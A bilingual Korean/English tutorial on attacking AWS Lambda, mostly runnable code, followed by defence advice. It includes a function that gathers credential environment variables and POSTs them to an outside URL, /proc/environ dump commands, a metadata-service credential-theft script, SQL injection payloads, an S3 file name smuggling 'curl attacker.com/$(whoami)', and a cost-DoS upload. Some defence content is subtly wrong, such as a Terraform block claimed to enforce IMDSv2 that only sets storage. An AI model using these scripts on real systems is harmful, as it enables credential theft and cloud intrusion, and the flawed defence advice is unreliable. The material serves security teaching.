> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# AWS Lambda 함수 공격 기법

## 0. 초보자를 위한 개념 이해

### AWS Lambda란?

**AWS Lambda**는 서버 없이 코드를 실행할 수 있는 서비스입니다. 코드를 작성해서 올려두면, 특정 이벤트가 발생할 때마다 자동으로 실행됩니다.

```
Lambda 실행 흐름:
이벤트 발생          Lambda 실행          결과 반환
(API 요청,     →    (코드 실행 + IAM    →  (응답 반환 +
 파일 업로드,         역할로 AWS 서비스     CloudWatch 로그)
 메시지 수신)         접근 가능)

실행 환경 특성:
- 함수마다 독립된 컨테이너에서 실행
- 실행 후 환경 종료 (메모리/파일 소멸)
- /tmp 디렉터리 (최대 10GB)만 임시 저장 가능
- 각 실행은 IAM 역할의 권한을 가짐
```

### 공격자가 Lambda를 노리는 이유

**1. IAM 역할 = 모든 AWS 자원에 대한 마스터 키 가능성**
```
Lambda 함수가 s3:* 권한을 가지면:
  → 공격자가 Lambda에 RCE 달성 시
  → 그 함수의 IAM 역할로 모든 S3 버킷 접근
  → 수백 GB의 데이터 탈취 가능
```

**2. 환경 변수에 자격증명 저장하는 개발자 관행**
```
많은 개발자가 편의상 환경 변수에 저장:
  DB_PASSWORD=mypassword123
  API_KEY=sk-abcdef...
  AWS_SECRET=...

→ RCE 달성 시 os.environ으로 즉시 획득
```

**3. 이벤트 소스의 다양성 = 넓은 공격 표면**
```
API Gateway (HTTP), SQS (메시지), S3 (파일),
DynamoDB Streams, EventBridge, SNS, Cognito...

→ 여러 경로로 악성 입력 주입 가능
```

### 서버리스 공격의 일반적인 킬 체인

```
1. 정찰 단계
   - Lambda 함수 이름, 런타임, 트리거 파악
   - 공개된 API 엔드포인트 식별

2. 초기 접근
   - 이벤트 인젝션 (커맨드/SQL/경로 인젝션)
   - 취약한 의존성 익스플로잇

3. 실행 (RCE)
   - Lambda 런타임 내 임의 코드 실행

4. 자격증명 수집
   - 환경 변수 덤프 (API 키, 비밀번호)
   - SSRF → IMDS → IAM 자격증명 탈취

5. 피벗 및 영향
   - 탈취한 IAM 자격증명으로 다른 AWS 서비스 접근
   - S3 버킷 탈취, RDS 접근, 다른 Lambda 함수 수정
```

---

## 1. 서버리스 위협 모델

서버리스 환경은 인프라 관리 부담을 줄이지만, 실행 컨텍스트·환경 변수·IAM 역할·이벤트 소스에 새로운 공격 표면이 생긴다.

| 공격 벡터 | 설명 | 심각도 |
|-----------|------|--------|
| 환경 변수 탈취 | API 키·DB 자격증명·시크릿 노출 | 높음 |
| IAM 역할 과다 권한 | Lambda 역할로 다른 AWS 서비스 접근 | 높음 |
| SSRF → 메타데이터 서비스 | IMDSv1 통해 IAM 임시 자격증명 획득 | 높음 |
| 의존성 인젝션 | npm/pip 패키지 타이포스쿼팅 | 중간 |
| 이벤트 인젝션 | 이벤트 소스(SQS·S3·API Gateway)를 통한 인젝션 | 높음 |
| 타임아웃 공격 | 긴 실행으로 비용·가용성 공격 | 중간 |
| 콜드 스타트 레이스 | 초기화 로직 타이밍 공격 | 낮음 |

---

## 2. 환경 변수 탈취

Lambda 함수 코드가 RCE(원격 코드 실행) 취약점을 가지면 환경 변수를 직접 읽을 수 있다.

### 환경 변수에 저장될 수 있는 민감 정보

```
AWS Lambda 환경 변수 예시:

자동으로 있는 것 (Lambda가 자동 주입):
  AWS_REGION=ap-northeast-2
  AWS_LAMBDA_FUNCTION_NAME=my-function
  AWS_ACCESS_KEY_ID=ASIA...     ← IAM 임시 자격증명!
  AWS_SECRET_ACCESS_KEY=...
  AWS_SESSION_TOKEN=...

개발자가 직접 넣는 것 (하드코딩 위험):
  DB_HOST=prod-db.internal
  DB_PASSWORD=supersecret123    ← 데이터베이스 비밀번호
  STRIPE_API_KEY=sk_live_...    ← 결제 API 키
  GITHUB_TOKEN=ghp_...          ← 소스코드 접근 토큰
```

```python
#!/usr/bin/env python3
"""환경 변수 탈취 시뮬레이터 (교육/CTF 목적).

RCE 취약점이 Lambda에서 악용될 때 일어날 수 있는 일을 보여줍니다.
"""

import os
import json
import urllib.request
from dataclasses import dataclass


@dataclass
class SensitiveEnvVar:
    """민감한 환경 변수 항목."""
    key: str
    value: str
    category: str  # IAM, DB, API, OTHER


def classify_env_var(key: str, value: str) -> str:
    """환경 변수를 카테고리로 분류."""
    key_upper = key.upper()
    
    if any(kw in key_upper for kw in ["AWS_ACCESS_KEY", "AWS_SECRET", "AWS_SESSION_TOKEN"]):
        return "IAM_CREDENTIALS"  # 가장 위험
    elif any(kw in key_upper for kw in ["DB_", "DATABASE_", "MYSQL_", "POSTGRES_", "MONGO_"]):
        return "DATABASE"
    elif any(kw in key_upper for kw in ["API_KEY", "STRIPE_", "TWILIO_", "SENDGRID_"]):
        return "API_KEY"
    elif any(kw in key_upper for kw in ["SECRET", "PASSWORD", "PASSWD", "TOKEN", "CREDENTIAL"]):
        return "SECRET"
    return "OTHER"


def dump_sensitive_env() -> list[SensitiveEnvVar]:
    """현재 환경에서 민감한 변수 추출."""
    sensitive = []
    
    for key, value in os.environ.items():
        category = classify_env_var(key, value)
        if category != "OTHER":
            sensitive.append(SensitiveEnvVar(key=key, value=value, category=category))
    
    # 가장 위험한 카테고리 먼저
    priority = {"IAM_CREDENTIALS": 0, "SECRET": 1, "DATABASE": 2, "API_KEY": 3}
    return sorted(sensitive, key=lambda x: priority.get(x.category, 99))


def exfiltrate_env(exfil_url: str, dry_run: bool = True) -> None:
    """환경 변수를 외부 서버로 전송 (시뮬레이터).
    
    dry_run=True: 실제 전송 없이 출력만 (안전한 교육용 모드)
    dry_run=False: 실제 외부 전송 (실제 공격/테스트 환경에서만)
    """
    sensitive = dump_sensitive_env()
    
    if not sensitive:
        print("[-] 민감한 환경 변수 없음")
        return
    
    print(f"[+] 민감한 환경 변수 {len(sensitive)}개 발견:")
    for var in sensitive:
        # 값의 앞 20자만 표시 (전체 노출 방지)
        preview = var.value[:20] + "..." if len(var.value) > 20 else var.value
        print(f"  [{var.category}] {var.key} = {preview}")
    
    if not dry_run:
        data = json.dumps([
            {"key": v.key, "value": v.value, "category": v.category}
            for v in sensitive
        ]).encode()
        
        req = urllib.request.Request(
            exfil_url,
            data=data,
            method="POST",
            headers={"Content-Type": "application/json"}
        )
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                print(f"[+] 전송 완료: {resp.status}")
        except Exception as e:
            print(f"[-] 전송 실패: {e}")
```

### 2.1 /proc/environ 접근

Linux에서 `/proc/` 가상 파일시스템은 프로세스 정보에 접근할 수 있는 특수 디렉터리입니다. Lambda도 Linux에서 실행되므로 RCE 달성 시 `/proc/1/environ`으로 환경 변수를 읽을 수 있습니다.

```bash
# Lambda 런타임에서 /proc/1/environ 읽기 (RCE 전제)
# /proc/1 = PID 1 (Lambda 런타임 프로세스)
# environ 파일은 null 바이트(\0)로 구분된 환경 변수 목록
cat /proc/1/environ | tr '\0' '\n'

# AWS 관련 환경 변수만 필터링
cat /proc/self/environ | tr '\0' '\n' | grep -E "AWS|SECRET|KEY|TOKEN"

# Lambda 전용 환경 변수 확인
cat /proc/self/environ | tr '\0' '\n' | grep -E "LAMBDA|HANDLER|RUNTIME"
```

**실제 Lambda 환경에서 발견되는 IAM 관련 환경 변수:**
```
AWS_ACCESS_KEY_ID=ASIA3XXXXXXXXXXXXX   ← 임시 자격증명
AWS_SECRET_ACCESS_KEY=abc123...        ← 비밀 키
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2...   ← 세션 토큰 (긴 문자열)
```

이 세 가지를 가져가면 Lambda 함수의 IAM 역할과 동일한 권한으로 AWS API를 호출할 수 있습니다 (만료 전까지 약 1시간).

---

## 3. SSRF → AWS 메타데이터 서비스 (IMDSv1)

```python
#!/usr/bin/env python3
"""Lambda 환경에서 SSRF를 이용한 IAM 자격증명 탈취 시뮬레이터.

실제 Lambda 내부 SSRF 시나리오를 CTF/교육 목적으로 시연.
IMDSv2 (토큰 기반)가 적용된 환경에서는 작동하지 않음.
"""

import argparse
import json
import urllib.request
import urllib.error


METADATA_BASE = "http://169.254.169.254/latest"


def fetch_metadata(path: str, timeout: int = 3) -> str | None:
    try:
        url = f"{METADATA_BASE}/{path}"
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.read().decode()
    except (urllib.error.URLError, OSError):
        return None


def get_iam_credentials() -> dict | None:
    role_name = fetch_metadata("meta-data/iam/security-credentials/")
    if not role_name:
        print("[-] IMDSv1 접근 불가 (IMDSv2 적용됨 or 메타데이터 서비스 비활성화)")
        return None

    role_name = role_name.strip()
    print(f"[+] IAM 역할 발견: {role_name}")

    creds_json = fetch_metadata(f"meta-data/iam/security-credentials/{role_name}")
    if not creds_json:
        return None

    creds = json.loads(creds_json)
    return {
        "RoleName": role_name,
        "AccessKeyId": creds.get("AccessKeyId"),
        "SecretAccessKey": creds.get("SecretAccessKey"),
        "Token": creds.get("Token"),
        "Expiration": creds.get("Expiration"),
    }


def check_imdsv2(timeout: int = 3) -> bool:
    """IMDSv2 적용 여부 확인."""
    try:
        req = urllib.request.Request(
            f"{METADATA_BASE}/api/token",
            method="PUT",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        )
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            token = resp.read().decode()
            return bool(token)
    except Exception:
        return False


def main() -> None:
    parser = argparse.ArgumentParser(description="AWS 메타데이터 서비스 취약점 진단 (교육용)")
    parser.add_argument("--check-only", action="store_true", help="IMDSv2 적용 여부만 확인")
    parser.add_argument("-o", "--output", help="결과 저장 경로")
    args = parser.parse_args()

    imdsv2 = check_imdsv2()
    print(f"[*] IMDSv2 적용: {'예 (보호됨)' if imdsv2 else '아니오 (취약)'}")

    if args.check_only or imdsv2:
        return

    creds = get_iam_credentials()
    if creds:
        print(f"[+] AccessKeyId: {creds['AccessKeyId']}")
        print(f"[+] 만료: {creds['Expiration']}")
        if args.output:
            with open(args.output, "w") as f:
                json.dump(creds, f, indent=2)
            print(f"결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 4. Lambda 이벤트 인젝션

### 이벤트 인젝션이란?

Lambda 함수는 여러 이벤트 소스에서 데이터를 받습니다. 공격자는 이 데이터를 통해 악의적인 페이로드를 주입합니다.

```
공격자 → API Gateway 요청 → Lambda 함수 → DB/OS/파일 시스템
          (조작된 파라미터)     (검증 없이 사용)  (취약점 실행)
```

### 4.1 API Gateway 이벤트 조작

**API Gateway Lambda 이벤트 구조:** Lambda가 받는 이벤트는 JSON 딕셔너리입니다. HTTP 요청의 모든 정보(메서드, 헤더, 바디, 쿼리 파라미터)가 포함됩니다.

```python
#!/usr/bin/env python3
"""API Gateway 이벤트 인젝션 취약점 및 방어 패턴 (교육용)."""

import json
import sqlite3
import re
from pathlib import Path


# API Gateway → Lambda 이벤트 구조
# 공격자가 이 구조를 이해하면 각 필드에 페이로드를 삽입할 수 있음
SAMPLE_MALICIOUS_EVENT = {
    "httpMethod": "POST",
    "path": "/api/query",
    "headers": {
        "Authorization": "Bearer TOKEN",
        "X-Forwarded-For": "'; DROP TABLE users; --"  # 헤더를 통한 인젝션
    },
    "body": '{"query": "1; DROP TABLE users--"}',         # 바디를 통한 SQL 인젝션
    "queryStringParameters": {
        "page": "1 UNION SELECT username,password FROM admin--"  # 쿼리 파라미터 인젝션
    }
}


# ❌ 취약한 Lambda 핸들러: 사용자 입력을 SQL에 직접 삽입
def handler_vulnerable(event: dict, context) -> dict:
    page = event["queryStringParameters"]["page"]
    conn = sqlite3.connect("/tmp/db.sqlite3")
    
    # 위험: f-string으로 SQL 직접 구성 → SQL 인젝션 취약
    # page = "1 UNION SELECT username,password FROM admin--" 이면
    # 모든 관리자 계정 정보가 반환됨!
    query = f"SELECT * FROM items WHERE id = {page}"
    results = conn.execute(query).fetchall()
    return {"statusCode": 200, "body": json.dumps(results)}


# ✅ 안전한 Lambda 핸들러: 파라미터화 쿼리 + 타입 검증
def handler_safe(event: dict, context) -> dict:
    page_str = event["queryStringParameters"].get("page", "1")
    
    # 1단계: 타입 검증 (숫자만 허용)
    if not page_str.isdigit():
        return {
            "statusCode": 400,
            "body": json.dumps({"error": "page must be a positive integer"})
        }
    
    page = int(page_str)
    
    # 2단계: 범위 검증 (너무 큰 페이지 번호 차단)
    if not 1 <= page <= 10000:
        return {
            "statusCode": 400,
            "body": json.dumps({"error": "page must be between 1 and 10000"})
        }
    
    conn = sqlite3.connect("/tmp/db.sqlite3")
    
    # 3단계: 파라미터화 쿼리 (SQL 인젝션 방지)
    # ? 자리에 page 값이 자동으로 이스케이프되어 삽입됨
    results = conn.execute(
        "SELECT id, title, content FROM items WHERE id = ?",
        (page,)
    ).fetchall()
    
    return {
        "statusCode": 200,
        "body": json.dumps([{"id": r[0], "title": r[1]} for r in results])
    }


# Lambda 이벤트 인젝션 탐지기
class EventInjectionDetector:
    """Lambda 이벤트에서 인젝션 패턴을 탐지."""
    
    INJECTION_PATTERNS = {
        "sql_injection": [
            r"union\s+select",
            r"drop\s+table",
            r"insert\s+into",
            r";\s*(select|update|delete|insert|drop)",
            r"--\s*$",          # SQL 주석
            r"'\s*or\s+'",      # OR 기반 바이패스
        ],
        "command_injection": [
            r";\s*(ls|cat|id|whoami|rm|curl|wget)",
            r"\$\(.*\)",
            r"`.*`",
            r"\|\s*(bash|sh|cmd)",
        ],
        "path_traversal": [
            r"\.\./",
            r"\.\.\\",
            r"%2e%2e%2f",
        ],
    }
    
    def scan_event(self, event: dict) -> list[dict]:
        """이벤트 전체를 스캔해서 인젝션 패턴 탐지."""
        findings = []
        event_str = json.dumps(event).lower()
        
        for attack_type, patterns in self.INJECTION_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, event_str, re.IGNORECASE):
                    findings.append({
                        "type": attack_type,
                        "pattern": pattern,
                        "severity": "HIGH" if attack_type in ("sql_injection", "command_injection") else "MEDIUM"
                    })
                    break
        
        return findings
```

### 4.2 S3 이벤트 트리거 조작

S3에 파일을 업로드하면 Lambda가 자동으로 실행됩니다. 파일명이나 파일 내용을 조작해 인젝션 공격을 시도할 수 있습니다.

```bash
# 공격 1: 파일명에 쉘 명령어 삽입
# Lambda가 파일명을 shell=True로 처리하면 명령 실행됨
aws s3 cp payload.zip "s3://target-bucket/$(curl attacker.com/$(whoami)).zip"

# 공격 2: 경로 순회를 이용한 파일명 
# Lambda가 키를 파일 경로로 사용하면 위험
aws s3 cp malicious.txt "s3://target-bucket/../../etc/passwd"

# 공격 3: 대용량 파일로 Lambda 타임아웃 유발 (DoS + 비용 공격)
# Lambda 최대 타임아웃 15분 × 요금 = 비용 폭탄
dd if=/dev/zero bs=1M count=500 | aws s3 cp - s3://target-bucket/large-file.bin

# 방어: 버킷 정책으로 최대 오브젝트 크기 제한 + 파일명 검증
```

---

## 5. Lambda 런타임 탐지

```python
#!/usr/bin/env python3
"""Lambda 런타임 환경 정보 수집 — 보안 감사용."""

import os
import json
import platform
import subprocess
from pathlib import Path


def collect_runtime_info() -> dict:
    info: dict = {}

    # Lambda 환경 변수
    lambda_vars = [
        "AWS_REGION", "AWS_DEFAULT_REGION", "AWS_LAMBDA_FUNCTION_NAME",
        "AWS_LAMBDA_FUNCTION_VERSION", "AWS_LAMBDA_FUNCTION_MEMORY_SIZE",
        "AWS_LAMBDA_LOG_GROUP_NAME", "AWS_EXECUTION_ENV",
        "LAMBDA_RUNTIME_DIR", "LAMBDA_TASK_ROOT",
        "_HANDLER", "AWS_LAMBDA_RUNTIME_API",
    ]
    info["lambda_env"] = {k: os.environ.get(k, "N/A") for k in lambda_vars}

    # 시스템 정보
    info["platform"] = {
        "system": platform.system(),
        "machine": platform.machine(),
        "python_version": platform.python_version(),
    }

    # /tmp 쓰기 가능 여부
    try:
        test_file = Path("/tmp/.test")
        test_file.write_text("test")
        test_file.unlink()
        info["tmp_writable"] = True
    except OSError:
        info["tmp_writable"] = False

    # /proc 접근 가능 여부
    info["proc_accessible"] = Path("/proc/self/status").exists()

    # 네트워크 인터페이스
    try:
        result = subprocess.run(
            ["ip", "addr"], capture_output=True, text=True, timeout=5
        )
        info["network"] = result.stdout[:500]
    except Exception:
        info["network"] = "접근 불가"

    return info


def lambda_handler(event: dict, context) -> dict:
    info = collect_runtime_info()
    return {
        "statusCode": 200,
        "body": json.dumps(info, indent=2, ensure_ascii=False),
    }
```

---

## 6. 방어 기법

### 6.1 IMDSv2 강제 적용

```bash
# EC2 인스턴스 메타데이터 서비스 v2 강제 (Lambda는 기본 IMDSv2)
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxx \
  --http-tokens required \
  --http-endpoint enabled

# Terraform으로 Lambda IMDSv2 강제
resource "aws_lambda_function" "secure" {
  # ...
  ephemeral_storage { size = 512 }
}
```

### 6.2 환경 변수 대신 AWS Secrets Manager 사용

```python
import boto3
import json
from functools import cache

@cache
def get_secret(secret_name: str) -> dict:
    client = boto3.client("secretsmanager", region_name="ap-northeast-2")
    response = client.get_secret_value(SecretId=secret_name)
    return json.loads(response["SecretString"])

def lambda_handler(event, context):
    # 환경 변수 대신 Secrets Manager 사용
    db_creds = get_secret("prod/myapp/database")
    db_password = db_creds["password"]
    # ...
```

---

## 7. Lambda 보안 체크리스트

| 항목 | 권장 설정 |
|------|-----------|
| IAM 역할 | 최소 권한 원칙 — 필요한 서비스만 허용 |
| 환경 변수 | KMS 암호화 활성화 |
| 시크릿 | Secrets Manager / Parameter Store 사용 |
| VPC | 민감 리소스 접근 시 VPC 내 배치 |
| IMDSv2 | 항상 강제 적용 |
| 타임아웃 | 적절한 제한 설정 (기본 3초, 최대 15분) |
| 동시성 | Reserved Concurrency로 DoS 방지 |
| 레이어 | 레이어 권한 최소화 |
| 코드 서명 | Code Signing Config 적용 |
| 감사 로그 | CloudTrail + CloudWatch Logs 활성화 |

---

<a name="english"></a>

# AWS Lambda Function Attack Techniques

## 1. Serverless Threat Model

Serverless environments reduce infrastructure management overhead, but introduce new attack surfaces in execution contexts, environment variables, IAM roles, and event sources.

| Attack Vector | Description |
|-----------|------|
| Environment Variable Exfiltration | Exposure of API keys, DB credentials, and secrets |
| Overprivileged IAM Role | Using Lambda role to access other AWS services |
| SSRF → Metadata Service | Obtaining temporary IAM credentials via IMDSv1 |
| Dependency Injection | npm/pip package typosquatting |
| Event Injection | Injection via event sources (SQS, S3, API Gateway) |
| Timeout Attack | Long-running executions causing cost/availability attacks |
| Cold Start Race | Timing attacks against initialization logic |

---

## 2. Environment Variable Exfiltration

If Lambda function code has an RCE vulnerability, environment variables can be read directly.

```python
# Dump environment variables from inside Lambda (post-RCE)
import os, json, urllib.request

def exfiltrate_env(exfil_url: str) -> None:
    env_vars = dict(os.environ)
    # Prioritize credential-related keys
    sensitive = {k: v for k, v in env_vars.items()
                 if any(kw in k.upper() for kw in
                        ["KEY", "SECRET", "TOKEN", "PASS", "DB", "CREDENTIAL"])}
    data = json.dumps(sensitive).encode()
    req = urllib.request.Request(exfil_url, data=data, method="POST")
    urllib.request.urlopen(req, timeout=5)
```

### 2.1 Accessing /proc/environ

```bash
# Reading /proc/1/environ from Lambda runtime (requires RCE)
cat /proc/1/environ | tr '\0' '\n'
cat /proc/self/environ | tr '\0' '\n' | grep -E "AWS|SECRET|KEY|TOKEN"
```

---

## 3. SSRF → AWS Metadata Service (IMDSv1)

```python
#!/usr/bin/env python3
"""Simulator for IAM credential exfiltration via SSRF in Lambda environments.

Demonstrates real-world Lambda SSRF scenarios for CTF/educational purposes.
Does not work in environments with IMDSv2 (token-based) enforced.
"""

import argparse
import json
import urllib.request
import urllib.error


METADATA_BASE = "http://169.254.169.254/latest"


def fetch_metadata(path: str, timeout: int = 3) -> str | None:
    try:
        url = f"{METADATA_BASE}/{path}"
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.read().decode()
    except (urllib.error.URLError, OSError):
        return None


def get_iam_credentials() -> dict | None:
    role_name = fetch_metadata("meta-data/iam/security-credentials/")
    if not role_name:
        print("[-] IMDSv1 not accessible (IMDSv2 enforced or metadata service disabled)")
        return None

    role_name = role_name.strip()
    print(f"[+] IAM role found: {role_name}")

    creds_json = fetch_metadata(f"meta-data/iam/security-credentials/{role_name}")
    if not creds_json:
        return None

    creds = json.loads(creds_json)
    return {
        "RoleName": role_name,
        "AccessKeyId": creds.get("AccessKeyId"),
        "SecretAccessKey": creds.get("SecretAccessKey"),
        "Token": creds.get("Token"),
        "Expiration": creds.get("Expiration"),
    }


def check_imdsv2(timeout: int = 3) -> bool:
    """Check whether IMDSv2 is enforced."""
    try:
        req = urllib.request.Request(
            f"{METADATA_BASE}/api/token",
            method="PUT",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        )
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            token = resp.read().decode()
            return bool(token)
    except Exception:
        return False


def main() -> None:
    parser = argparse.ArgumentParser(description="AWS Metadata Service vulnerability assessment (educational)")
    parser.add_argument("--check-only", action="store_true", help="Only check whether IMDSv2 is enforced")
    parser.add_argument("-o", "--output", help="Path to save results")
    args = parser.parse_args()

    imdsv2 = check_imdsv2()
    print(f"[*] IMDSv2 enforced: {'Yes (protected)' if imdsv2 else 'No (vulnerable)'}")

    if args.check_only or imdsv2:
        return

    creds = get_iam_credentials()
    if creds:
        print(f"[+] AccessKeyId: {creds['AccessKeyId']}")
        print(f"[+] Expiration: {creds['Expiration']}")
        if args.output:
            with open(args.output, "w") as f:
                json.dump(creds, f, indent=2)
            print(f"Results saved: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 4. Lambda Event Injection

### 4.1 API Gateway Event Manipulation

```python
# Example API Gateway → Lambda event structure
event = {
    "httpMethod": "POST",
    "path": "/api/query",
    "headers": {"Authorization": "Bearer TOKEN"},
    "body": '{"query": "1; DROP TABLE users--"}',  # SQL injection
    "queryStringParameters": {
        "page": "1 UNION SELECT username,password FROM admin--"
    }
}

# Vulnerable Lambda handler (susceptible to injection)
def handler_vulnerable(event, context):
    import sqlite3
    page = event["queryStringParameters"]["page"]
    conn = sqlite3.connect("/tmp/db.sqlite3")
    # Dangerous: direct format string — SQLi vulnerable
    results = conn.execute(f"SELECT * FROM items WHERE id = {page}").fetchall()
    return {"statusCode": 200, "body": str(results)}

# Safe handler
def handler_safe(event, context):
    import sqlite3
    page = event["queryStringParameters"].get("page", "1")
    if not page.isdigit():
        return {"statusCode": 400, "body": "Invalid page parameter"}
    conn = sqlite3.connect("/tmp/db.sqlite3")
    results = conn.execute("SELECT * FROM items WHERE id = ?", (int(page),)).fetchall()
    return {"statusCode": 200, "body": str(results)}
```

### 4.2 S3 Event Trigger Manipulation

```bash
# Lambda trigger manipulation via S3 events
# Inserting special characters in filenames → command injection during Lambda processing
aws s3 cp payload.zip "s3://target-bucket/$(curl attacker.com/$(whoami)).zip"

# Triggering Lambda timeout with large files (cost DoS)
dd if=/dev/zero bs=1M count=500 | aws s3 cp - s3://target-bucket/large-file.bin
```

---

## 5. Lambda Runtime Fingerprinting

```python
#!/usr/bin/env python3
"""Lambda runtime environment information gathering — for security audits."""

import os
import json
import platform
import subprocess
from pathlib import Path


def collect_runtime_info() -> dict:
    info: dict = {}

    # Lambda environment variables
    lambda_vars = [
        "AWS_REGION", "AWS_DEFAULT_REGION", "AWS_LAMBDA_FUNCTION_NAME",
        "AWS_LAMBDA_FUNCTION_VERSION", "AWS_LAMBDA_FUNCTION_MEMORY_SIZE",
        "AWS_LAMBDA_LOG_GROUP_NAME", "AWS_EXECUTION_ENV",
        "LAMBDA_RUNTIME_DIR", "LAMBDA_TASK_ROOT",
        "_HANDLER", "AWS_LAMBDA_RUNTIME_API",
    ]
    info["lambda_env"] = {k: os.environ.get(k, "N/A") for k in lambda_vars}

    # System information
    info["platform"] = {
        "system": platform.system(),
        "machine": platform.machine(),
        "python_version": platform.python_version(),
    }

    # Check /tmp writability
    try:
        test_file = Path("/tmp/.test")
        test_file.write_text("test")
        test_file.unlink()
        info["tmp_writable"] = True
    except OSError:
        info["tmp_writable"] = False

    # Check /proc accessibility
    info["proc_accessible"] = Path("/proc/self/status").exists()

    # Network interfaces
    try:
        result = subprocess.run(
            ["ip", "addr"], capture_output=True, text=True, timeout=5
        )
        info["network"] = result.stdout[:500]
    except Exception:
        info["network"] = "Not accessible"

    return info


def lambda_handler(event: dict, context) -> dict:
    info = collect_runtime_info()
    return {
        "statusCode": 200,
        "body": json.dumps(info, indent=2, ensure_ascii=False),
    }
```

---

## 6. Defense Techniques

### 6.1 Enforcing IMDSv2

```bash
# Force EC2 Instance Metadata Service v2 (Lambda defaults to IMDSv2)
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxx \
  --http-tokens required \
  --http-endpoint enabled

# Enforce Lambda IMDSv2 via Terraform
resource "aws_lambda_function" "secure" {
  # ...
  ephemeral_storage { size = 512 }
}
```

### 6.2 Using AWS Secrets Manager Instead of Environment Variables

```python
import boto3
import json
from functools import cache

@cache
def get_secret(secret_name: str) -> dict:
    client = boto3.client("secretsmanager", region_name="ap-northeast-2")
    response = client.get_secret_value(SecretId=secret_name)
    return json.loads(response["SecretString"])

def lambda_handler(event, context):
    # Use Secrets Manager instead of environment variables
    db_creds = get_secret("prod/myapp/database")
    db_password = db_creds["password"]
    # ...
```

---

## 7. Lambda Security Checklist

| Item | Recommended Setting |
|------|-----------|
| IAM Role | Principle of least privilege — allow only required services |
| Environment Variables | Enable KMS encryption |
| Secrets | Use Secrets Manager / Parameter Store |
| VPC | Place inside VPC when accessing sensitive resources |
| IMDSv2 | Always enforce |
| Timeout | Set appropriate limits (default 3s, max 15 minutes) |
| Concurrency | Use Reserved Concurrency to prevent DoS |
| Layers | Minimize layer permissions |
| Code Signing | Apply Code Signing Config |
| Audit Logs | Enable CloudTrail + CloudWatch Logs |
